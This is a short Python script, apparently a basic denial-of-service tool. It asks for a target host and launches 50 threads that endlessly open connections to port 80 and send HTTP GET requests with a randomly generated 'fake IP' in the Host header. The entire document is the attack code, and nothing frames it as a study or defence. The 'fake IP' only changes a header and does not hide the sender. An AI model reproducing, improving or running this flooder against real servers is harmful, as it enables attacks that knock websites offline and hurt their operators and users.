target = input("Target -> ")
fakeIp = "0.0.0.0"
ports = [80]

import socket
import threading
import random


def attack (target) :

    def newIP ():

        a = random.randint(1, 211)
        b = random.randint(1, 211)
        c = random.randint(1, 211)
        d = random.randint(1, 211)

        fkIP = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
        return fkIP

    while True:
        fakeIp = newIP()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, ports[0]))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, ports[0]))
        s.sendto(("Host: " + fakeIp + "\r\n\r\n").encode('ascii'), (target, ports[0]))
        print(fakeIp + " -> " + target + "\n")
        s.close()


for v in range(50):
    thr = threading.Thread(target = attack, args = (target,))
    thr.start()